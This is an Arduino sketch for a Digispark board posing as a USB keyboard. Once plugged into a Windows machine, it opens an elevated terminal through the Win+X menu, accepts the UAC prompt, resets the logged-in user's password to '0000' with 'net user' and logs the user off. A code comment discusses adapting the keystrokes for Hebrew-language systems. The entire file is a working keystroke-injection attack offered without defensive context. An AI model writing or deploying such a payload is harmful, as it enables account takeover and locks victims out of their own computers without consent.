#include "DigiKeyboard.h"

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_A);
  DigiKeyboard.delay(500);

  DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  //maybe ALT, delay, Y could work both for english and hebrew systems,
  //instead of LEFT / RIGHT, ENTER.
  DigiKeyboard.delay(1000);

  DigiKeyboard.print("net user $env:USERNAME 0000");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);

  DigiKeyboard.print("shutdown /l");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
}
void loop() {
}
